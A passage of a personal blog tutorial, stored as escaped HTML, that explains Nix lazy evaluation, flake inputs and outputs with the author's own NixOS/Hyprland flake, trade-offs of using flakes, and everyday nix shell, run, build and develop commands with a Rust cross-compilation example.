tool.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Ccode>devShells\u003C/code> for your frontend and backend teams.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Ccode>nixosConfigurations\u003C/code> for a production server and a local virtual machine.\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Cp>Because the language is \u003Cstrong>lazy\u003C/strong>, if you run a command like \u003Ccode>nix build .#server\u003C/code>, Nix will \u003Cstrong>only\u003C/strong> evaluate and build that specific server package and its dependencies. It completely ignores the definitions for the command-line tool, the development shells, and the other system configurations, saving a huge amount of time and resources. You can define an entire universe of components without paying the price for anything you don’t immediately use\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nixos-flakes/5.png\" alt=\"\">\u003C/p>\n\u003Cp>Since the language is \u003Cstrong>lazy\u003C/strong>, the right-hand sides of the attributes will not be evaluated until they are actually needed, if at all.\u003C/p>\n\u003Cp>For instance, if we install any specific component from this set, say,\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>nix-env -i hello\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>then only the \u003Cstrong>hello\u003C/strong> value will be evaluated (although it may in turn require other values to be evaluated, such as \u003Cstrong>stdenv\u003C/strong>).\u003C/p>\n\u003Cp>Laziness also allows greater efficiency if only parts of a complex data structure are needed.\u003C/p>\n\u003Cp>Take the operation:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>nix-env -qa\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>which prints the \u003Cstrong>name\u003C/strong> attribute of all top-level derivations in a Nix expression.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nixos-flakes/6.png\" alt=\"\">\u003C/p>\n\u003Cp>Laziness allows arguments to be passed to functions that may not be used is the main idea .\u003C/p>\n\u003Ch2 id=\"nix-flakes-\">NIX FLAKES : )\u003C/h2>\n\u003Cp>A \u003Cstrong>Nix expression\u003C/strong> is code written in the Nix language that describes how to build or configure something, while a \u003Cstrong>Nix file\u003C/strong> is a \u003Ccode>.nix\u003C/code> file that contains one or more of these Nix expressions.\u003C/p>\n\u003Cp>For example:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nixos-flakes/8.png\" alt=\"\">\u003C/p>\n\u003Cp>The first line, \u003Ccode>{ pkgs ? import &#x3C;nixpkgs> {} }:\u003C/code>, defines a function that takes an argument named \u003Ccode>pkgs\u003C/code>, which by default is set to the result of importing \u003Ccode>&#x3C;nixpkgs>\u003C/code>. This gives the expression access to the standard Nix package set, allowing the use of common utilities and build functions. The next expression, \u003Ccode>pkgs.stdenv.mkDerivation { ... }\u003C/code>, declares a derivation, which is a build recipe describing how to construct a package. Inside this derivation, the attributes \u003Ccode>pname = \"muffin\";\u003C/code> and \u003Ccode>version = \"1.0.0\";\u003C/code> specify the package name and version. The \u003Ccode>src = ./.;\u003C/code> line indicates that the source files for the package are located in the current directory, i.e., the same directory as the \u003Ccode>.nix\u003C/code> file itself. The \u003Ccode>buildPhase\u003C/code> section is a shell script that runs during the build process; in this case, it simply creates a file named \u003Ccode>muffin.txt\u003C/code> containing the message “Baking a delicious muffin…”.\u003C/p>\n\u003Cp>Hopefully this muffin example gave an idea about how nix expressions work , just the syntax tho :3\u003C/p>\n\u003Ch2 id=\"so-what-the-fuck-are-flakes-now\">So what the fuck are flakes now ?\u003C/h2>\n\u003Cp>The basic idea of flakes isn’t that complicated, but it does require a little bit of basic understanding of the nix programming language(try making your own .nix expression adhering to the muffin example the nix error checker is very nice and :) ) . A \u003Ccode>flake.nix\u003C/code> file is an attribute set with two attributes called \u003Ccode>inputs\u003C/code> and \u003Ccode>outputs\u003C/code>. The \u003Ccode>inputs\u003C/code> attribute describes the other flakes that you would like to use; things like nixpkgs or home-manager. You have to give it the url where the code for that other flake is, and usually people use GitHub. The \u003Ccode>outputs\u003C/code> attribute is a \u003Cem>function\u003C/em>, which is where we really start getting into the nix programming language. Nix will go and fetch all the inputs, load up \u003Cem>their\u003C/em> \u003Ccode>flake.nix\u003C/code> files, and it will call your \u003Ccode>outputs\u003C/code> function with all of \u003Cem>their outputs\u003C/em> as arguments. The outputs of a flake are just whatever its \u003Ccode>outputs\u003C/code> function returns, which can be basically anything the flake wants it to be. Finally, nix records exactly which revision was fetched from GitHub in \u003Ccode>flake.lock\u003C/code> so that the versions of all your inputs are pinned to the same thing until you manually update the lock file.\u003C/p>\n\u003Cp>Now, I said that the outputs of a flake can be basically anything you want, but \u003Cem>by convention\u003C/em>, there’s a schema that most flakes adhere to. For instance, flakes often include outputs like \u003Ccode>packages.x86_64-linux.foo\u003C/code> as the derivation for the \u003Ccode>foo\u003C/code> package for \u003Ccode>x86_64-linux\u003C/code>. But it’s important to understand that \u003Cem>this is a convention\u003C/em>, which the nix CLI uses by default for a lot of commands. The reason I consider this important to understand is because people often assume flakes are some complicated thing, and that therefore flakes somehow change the fundamentals of how nix works and how we use it. They don’t. All the flakes feature does is look at the inputs you need, fetch them, and call your outputs function. It’s truly that simple. Pretty much everything else that comes up when using flakes is actually just traditional nix, and not flakes-related at all.\u003C/p>\n\u003Cp>Enough yapping , lets see an actual flake now which i use for my hyprland ecosystem\u003C/p>\n\u003Cp>This flake defines a \u003Cstrong>NixOS system configuration\u003C/strong> using the experimental \u003Cstrong>flakes system\u003C/strong>. At its core, the flake is a self-contained directory that includes a \u003Ccode>flake.nix\u003C/code> file, specifying inputs, outputs, and the system it builds. The flake begins with a \u003Ccode>description\u003C/code> field, giving a human-readable label for the configuration, in this case \u003Ccode>\"My NixOS configuration\"\u003C/code>.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"nix\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  description\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"My NixOS configuration\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  inputs\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    nixpkgs\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">url\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"github:nixos/nixpkgs/nixos-unstable\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    caelestia-shell\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">      url\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"github:caelestia-dots/shell\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">      inputs\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">nixpkgs\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">follows\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"nixpkgs\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    };\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  };\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  outputs\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> { self\u003C/span>\u003Cspan style=\"color:#F97583\">,\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nixpkgs\u003C/span>\u003Cspan style=\"color:#F97583\">,\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> caelestia-shell\u003C/span>\u003Cspan style=\"color:#F97583\">,\u003C/span>\u003Cspan style=\"color:#F97583\"> ... \u003C/span>\u003Cspan style=\"color:#E1E4E8\">}@inputs:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    let\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">      system\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"x86_64-linux\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">      pkgs\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#FFAB70\"> nixpkgs\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#FFAB70\">legacyPackages\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#E1E4E8\">${\u003C/span>\u003Cspan style=\"color:#FFAB70\">system\u003C/span>\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    in\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">      nixosConfigurations\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">nixos\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#FFAB70\"> nixpkgs\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#FFAB70\">lib\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#FFAB70\">nixosSystem\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        inherit\u003C/span>\u003Cspan style=\"color:#B392F0\"> system\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        modules\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">          ./configuration.nix\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">          # Inline module to add Caelestia Shell with CLI\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            environment\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#B392F0\">systemPackages\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">              (\u003C/span>\u003Cspan style=\"color:#FFAB70\">caelestia-shell\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#FFAB70\">packages\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#E1E4E8\">${\u003C/span>\u003Cspan style=\"color:#FFAB70\">system\u003C/span>\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003Cspan style=\"color:#F97583\">.\u003C/span>\u003Cspan style=\"color:#FFAB70\">with-cli\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            ];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        ];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        specialArgs\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> { \u003C/span>\u003Cspan style=\"color:#F97583\">inherit\u003C/span>\u003Cspan style=\"color:#B392F0\"> inputs\u003C/span>\u003Cspan style=\"color:#B392F0\"> system\u003C/span>\u003Cspan style=\"color:#E1E4E8\">; };\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">      };\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    };\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The \u003Ccode>inputs\u003C/code> section declares dependencies required by this flake. It includes \u003Ccode>nixpkgs\u003C/code>, referencing the unstable branch of the official NixOS package collection from GitHub. It also includes a custom flake, \u003Ccode>caelestia-shell\u003C/code>, which represents a shell environment maintained externally. To ensure consistency, \u003Ccode>caelestia-shell\u003C/code> is configured to use the same \u003Ccode>nixpkgs\u003C/code> version as the main flake via \u003Ccode>inputs.nixpkgs.follows = \"nixpkgs\"\u003C/code>. This prevents version mismatches between package sets when building the system.\u003C/p>\n\u003Cp>The \u003Ccode>outputs\u003C/code> function defines what this flake produces. It takes all declared inputs and makes them available for use within the flake. Inside \u003Ccode>outputs\u003C/code>, the \u003Ccode>system\u003C/code> variable is set to \u003Ccode>\"x86_64-linux\"\u003C/code>, and \u003Ccode>pkgs\u003C/code> is assigned the corresponding \u003Ccode>nixpkgs\u003C/code> package set for that system. This allows the flake to reference packages specific to the target architecture during system construction.\u003C/p>\n\u003Cp>Within the outputs, a NixOS configuration called \u003Ccode>nixos\u003C/code> is defined using \u003Ccode>nixpkgs.lib.nixosSystem\u003C/code>. This function builds a fully specified NixOS system. The configuration uses two modules: the main \u003Ccode>configuration.nix\u003C/code> file, which contains standard user-defined system settings, and an inline module that adds the Caelestia Shell CLI to \u003Ccode>environment.systemPackages\u003C/code>. This ensures that the shell is globally available on the system. The \u003Ccode>specialArgs\u003C/code> attribute passes \u003Ccode>inputs\u003C/code> and \u003Ccode>system\u003C/code> to all modules, allowing modules to reference flake inputs or architecture-specific values if necessary.\u003C/p>\n\u003Ch2 id=\"should-i-use-flakes-in-my-project\">Should I use flakes in my project?\u003C/h2>\n\u003Cp>I think that Nix flakes have some considerable benefits, such as:\u003C/p>\n\u003Cul>\n\u003Cli>Convenient pinning of evaluation-time dependencies\u003C/li>\n\u003Cli>Eliminating pointless rebuilds of code by only including tracked files in builds\u003C/li>\n\u003Cli>Making Nix code, on average, much more reproducible by pervasive pinning\u003C/li>\n\u003Cli>Allegedly caching evaluation\u003C/li>\n\u003Cli>Possibly making Nix easier to learn by reducing the amount of poking at strange attribute sets and general \u003Ccode>NIX_PATH\u003C/code> brokenness\u003C/li>\n\u003C/ul>\n\u003Cp>The \u003Cstrong>Nix language\u003C/strong>, along with functions and \u003Ccode>nixpkgs\u003C/code> utilities, provides a powerful composition primitive. In my experience, these tools are especially useful in \u003Cstrong>monorepos\u003C/strong>, where different parts of a project need to be assembled modularly and flexibly. Functions allow parametrization and reuse, while \u003Ccode>nixpkgs\u003C/code> provides a rich set of prebuilt packages and build utilities that make composing systems straightforward.\u003C/p>\n\u003Cp>While \u003Cstrong>flakes\u003C/strong> are a useful entry point for projects and make dependency management, version control integration, and lockfiles easy, they are not always the most practical tool for composing software. In medium-sized projects, locking subproject dependencies can be undesirable, and for very small utilities, writing a separate \u003Ccode>flake.nix\u003C/code> feels like unnecessary overhead. In very large projects, like \u003Ccode>nixpkgs\u003C/code> itself, managing everything through flakes would make the \u003Ccode>flake.nix\u003C/code> file enormous and unwieldy, containing potentially hundreds of thousands of inputs.\u003C/p>\n\u003Cp>Flakes also have limitations when it comes to \u003Cstrong>flexible builds\u003C/strong>. They provide minimal support for runtime configuration, and customizing builds often requires awkward workarounds like \u003Ccode>--override-input\u003C/code>. This means all build variants must either be anticipated ahead of time or implemented using traditional Nix primitives such as functions, overlays, and modules. Flakes are also difficult to use for \u003Cstrong>cross-compilation\u003C/strong>, since there is no straightforward way to specify a target architecture, making constructs like \u003Ccode>packages.${system}\u003C/code> unusable in that context.\u003C/p>\n\u003Cp>Because of these constraints, even in a flakes-based setup, it is often more effective to rely on \u003Cstrong>traditional Nix composition primitives\u003C/strong> to assemble software both in the small and in the large. A flake can then serve mainly as an \u003Cstrong>entry point\u003C/strong> and a way to fetch dependencies needed for evaluation, while build-time dependencies can be handled through primitives like \u003Ccode>pkgs.fetchurl\u003C/code> or \u003Ccode>pkgs.fetchFromGitHub\u003C/code>. To expose multiple configurations of a program, it is common to write a lambda that accepts configuration parameters and call it multiple times to produce different outputs. This approach separates configuration capability from specific build definitions, avoiding the need to embed complex logic in the flake itself.\u003C/p>\n\u003Cp>One of the most distinctive features of Nix is that it is \u003Cstrong>Turing complete\u003C/strong>. While this can make static analysis difficult, it also provides immense flexibility: packages can be patched programmatically, configurations can be generated dynamically, and arbitrary files can be read and processed at build time. Because Nix is a \u003Cstrong>functional language\u003C/strong>, its fundamental composition primitive is the function. Even constructs like NixOS modules or overlays are functions that can be imported, partially applied, or reused across projects. In practice, modules are usually imported by path rather than generated dynamically, because imports are deduplicated by filename.\u003C/p>\n\u003Ch2 id=\"flakenix-defaultnix-shellnix-in-project-directories\">\u003Ccode>flake.nix\u003C/code> (\u003Ccode>default.nix\u003C/code>, \u003Ccode>shell.nix\u003C/code>) in project directories\u003C/h2>\n\u003Cp>These are \u003Cem>developer\u003C/em> packaging of projects: pinned tool versions, not caring as much about unifying dependencies with the system, etc. To this end, they provide dev shells to work on a project, and are versioned \u003Cem>with\u003C/em> the project. Additionally they may provide packaging to install a tool separately from nixpkgs.\u003C/p>\n\u003Cp>There are a couple of things that make these notable compared to the packaging one might see in nixpkgs:\u003C/p>\n\u003Cul>\n\u003Cli>In nixpkgs, more build time is likely tolerated, and there is little desire to do incremental compilation. Import from derivation is also banned from nixpkgs. For these reasons, packaging outside of nixpkgs likely uses different frameworks and other similar tools that reduce the burden of maintaining Nix packaging or speed up rebuilds.\u003C/li>\n\u003Cli>It’s versioned with the software and so more crimes are generally tolerated: one might pin libraries or other such things, and update nixpkgs infrequently.\u003C/li>\n\u003Cli>They include the tools to \u003Cem>work on\u003C/em> a project, which may be a superset of the tools required to build it, for example in the case of checked-in generated code or other such things.\u003C/li>\n\u003Cli>They may include things like checks, post-commit hooks and other project infrastructure.\u003C/li>\n\u003C/ul>\n\u003Cp>Shells are just made of environment variables and (without building one at least) don’t create a single \u003Ccode>bin\u003C/code> folder of all the things in the shell, for instance. Also, since they are made of environment variables, they don’t have much ability to perform effects such as managing services or on-disk state.\u003C/p>\n\u003Cp>Use this for tools specific to one project, such as compilers and libraries for that project. Depending on taste and circumstances, these may or may not be used for language servers. Generally these are not used for providing tools like \u003Ccode>git\u003C/code> or \u003Ccode>nix\u003C/code> that are expected to be on the system, unless they are required to actually compile the software.\u003C/p>\n\u003Cp>(Note that for Bad Reasons, \u003Ccode>nix-shell -p\u003C/code> is not equivalent to \u003Ccode>nix shell\u003C/code>: the latter does not provide a compiler or \u003Ccode>stdenv\u003C/code> as would be necessary to build software. The technical reason here is that \u003Ccode>nix shell\u003C/code> constructs the shell within C++ code in Nix, whereas \u003Ccode>nix-shell -p\u003C/code> is more or less \u003Ccode>nix develop\u003C/code> on a questionable string templated expression involving \u003Ccode>pkgs.mkShell\u003C/code>)\u003C/p>\n\u003Cp>To demonstrate this i’ve written a  Rust + Nix project with \u003Cstrong>multi-target cross-compilation and Docker support\u003C/strong>\u003C/p>\n\u003Cp>In this guide, we’ll learn how to build a \u003Cstrong>Rust project\u003C/strong> using \u003Cstrong>Nix flakes\u003C/strong> with full \u003Cstrong>multi-target cross-compilation\u003C/strong> and \u003Cstrong>Docker image generation\u003C/strong>. Instead of relying on local toolchains or ad-hoc scripts, we’ll declare everything Rust versions, dependencies, targets, and environment inside a single \u003Ccode>flake.nix\u003C/code> file. This gives us a fully reproducible, isolated, and declarative setup. By the end, you’ll understand how Nix ensures consistent builds across machines, how it provisions multiple targets like \u003Ccode>x86_64-unknown-linux-musl\u003C/code>, \u003Ccode>aarch64-unknown-linux-gnu\u003C/code>, and \u003Ccode>x86_64-pc-windows-gnu\u003C/code>, and how to package your Rust binary inside a lightweight Docker image all from one flake-based configuration\u003C/p>\n\u003Ch3 id=\"why-use-nix-flakes-for-any-projects\">Why Use Nix Flakes for ANY Projects?\u003C/h3>\n\u003Cp>\u003Cimg src=\"/images/posts/nixos-flakes/Rustflakes.png\" alt=\"\">\u003C/p>\n\u003Cp>When building Rust applications, especially for production or cross-platform distribution, you face several common challenges. Different machines often have different Rust versions installed via \u003Ccode>rustup\u003C/code>, leading to toolchain drift. Native libraries like OpenSSL vary wildly across distros, creating system dependency chaos. Setting up Windows or ARM targets requires painful manual linker configuration. Build scripts that work perfectly on your local machine mysteriously break in CI environments, and multi-stage Dockerfiles end up duplicating build logic in confusing ways.\u003C/p>\n\u003Cp>\u003Cstrong>Nix Flakes Solution:\u003C/strong>\u003C/p>\n\u003Cp>With the \u003Ca href=\"https://github.com/mooofin/Rustflakes\">Rustflakes\u003C/a> approach, you get a much cleaner solution. One \u003Ccode>flake.nix\u003C/code> file becomes your single source of truth, declaring the Rust version, all system dependencies, and build targets in one place. Builds are hermetic—they don’t rely on whatever happens to be installed on your host system. Cross-compilation becomes trivial: just add a target to \u003Ccode>flake.nix\u003C/code> and run \u003Ccode>nix build .#windows\u003C/code> or \u003Ccode>.#aarch64\u003C/code>. You even get Docker images for free, generated directly from Nix derivations. Since dependencies are vendored in \u003Ccode>vendor/\u003C/code>, builds work offline without network access.\u003C/p>\n\u003Cp>This makes Rustflakes particularly valuable for teams needing consistent builds across developer machines and CI, projects targeting multiple platforms like Linux, Windows, and ARM, embedded or IoT applications requiring specific toolchain versions, and security-conscious environments requiring reproducible builds.\u003C/p>\n\u003Cp>The repository demonstrates this with working examples for \u003Ccode>x86_64-linux\u003C/code>, \u003Ccode>aarch64-linux\u003C/code>, and \u003Ccode>x86_64-windows\u003C/code> targets, all built from the same declarative configuration.\u003C/p>\n\u003Ch3 id=\"building-the-project\">Building the Project\u003C/h3>\n\u003Cp>Let’s walk through using this Nix-based Rust project:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nixos-flakes/10.png\" alt=\"\">\u003C/p>\n\u003Cp>Entering the environment gives us\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nixos-flakes/11.png\" alt=\"\">\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>If you want to run a simple stand-alone binary just once, use nix run. E.g. \u003Ccode>nix run nixpkgs#tree\u003C/code> (the command will have to live in \u003Ccode>$out/bin/&#x3C;pname>\u003C/code>) (or \u003Ccode>meta.mainProgram\u003C/code>, if that exists)\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>To pass it arguments, use \u003Ccode>--\u003C/code> or your flags will be interpreted by \u003Ccode>nix run\u003C/code>, not passed to the command. E.g. \u003Ccode>nix run nixpkgs#tree -- -a\u003C/code>\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>To put that in the PATH of your current shell, temporarily, so you can run it a bunch of times today: \u003Ccode>nix shell nixpkgs#ffmpeg\u003C/code>. Tip: to enable multiple programs: \u003Ccode>nix shell nixpkgs#{ffmpeg,tree,imagemagick}\u003C/code>.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Maybe your desired binary exists in \u003Ccode>$out/bin\u003C/code>, but has a different name? This is an odd one: \u003Ccode>nix shell nixpkgs#postgresql --command psql ...\u003C/code> (extra odd: you don’t need to use \u003Ccode>--\u003C/code> to separate program args from nix args.) (I understand the “why” behind this, but I hate it. The new \u003Ccode>nix\u003C/code> command was supposed to solve the counterintuitive UI problem, but here we are, back to square 1.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Say you want to “build” a derivation, you use \u003Ccode>nix build\u003C/code>, although if it’s available in a binary cache it will just fetch it from there: \u003Ccode>nix build nixpkgs#imagemagick\u003C/code>. Now you have it in your \u003Ccode>/nix/store\u003C/code>, and a symlink to that path in \u003Ccode>./result\u003C/code>.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Sometimes I just want to build something and print the path to stdout, without actually creating a link in \u003Ccode>/nix/store\u003C/code>. Combine two flags: \u003Ccode>nix build nixpkgs#imagemagick --print-out-paths --no-link\u003C/code>.\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>I use that to do stuff like this: \u003Ccode>$ nix run nixpkgs#tree -- $(nix build nixpkgs#imagemagick --print-out-paths --no-link)/bin\u003C/code>.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Or this, on mac: \u003Ccode>open $(nix build nixpkgs#grandperspective --print-out-paths --no-link)/Applications/*\u003C/code>\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>You can see how \u003Ccode>nix run\u003C/code> really is just syntactic sugar for \u003Ccode>$(nix build --no-link --print-out-paths &#x3C;deriv>)/bin/&#x3C;deriv.meta.mainProgram or deriv.pname>\u003C/code> (sort of)\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ul>\n\u003Cp>But my all time favourite is \u003Ccode>nix develop\u003C/code>: it plops you in a \u003Cem>build shell\u003C/em> for a derivation. This means you can pretend you are the nix builder, locally. Including fetching the source!\u003C/p>\n\u003Cp>E.g., to build sbcl (the lisp compiler) locally, without installing anything else nor even downloading the source, just:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> cd\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> $(\u003C/span>\u003Cspan style=\"color:#B392F0\">mktemp\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -d\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> nix\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> develop\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> nixpkgs#sbcl\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> unpackPhase\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> cd\u003C/span>\u003Cspan style=\"color:#79B8FF\"> *\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> patchPhase\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> eval\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">$buildPhase\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ....\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> debug\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> problems\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> here...\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>I think this is very neat.\u003C/p>\n\u003Cp>SO to summarise\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>nix shell: alters your shell. Use it when you want to \u003Cem>use\u003C/em> a package.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>nix develop: for \u003Cem>developing\u003C/em> something. Only use it when you are developing a 